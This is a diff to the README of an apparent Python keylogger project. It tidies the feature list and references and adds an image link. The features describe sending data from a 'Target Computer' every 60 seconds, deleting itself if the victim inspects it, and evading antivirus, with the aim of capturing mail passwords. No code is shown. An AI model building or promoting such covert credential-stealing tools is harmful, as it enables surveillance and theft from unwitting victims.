@@ -14,15 +14,14 @@ TO INSTALL REQUIREMENTS.TXT WE NEED TO RUN THE COMMAND
 4. RUN python3 keylogger.py
 
 Features:
-1. Every 60 seconds,You Get the Data from the Target Computer.
+1. Every 60 seconds, You Get the Data from the Target Computer.
 2. If Target finds the Code and Open the File for Want to Learn your MAIL and
 Password The Program DELETE itself.
 3. Antivirus Test:
  It passes antivirus software.
+![image](https://github.com/mm0900/KEYLOGGER-MAIL/assets/103401842/e2653c4e-5cc0-4855-819e-a57f775ae981)
 
 References
-➢ Nmap - Free Security Scanner for Network Exploration & Security Audits. (n.d.).
-Retrieved from https://nmap.org/
-➢ Mailtrap. (n.d.). Fake SMTP testing, email testing for QA & development teams.
-Retrieved from https://mailtrap.io/
+➢ Nmap - Free Security Scanner for Network Exploration & Security Audits. (n.d.). Retrieved from https://nmap.org/
+➢ Mailtrap. (n.d.). Fake SMTP testing, and email testing for QA & development teams. Retrieved from https://mailtrap.io/
 ➢ Python. (n.d.). Retrieved from https://www.python.org/ 
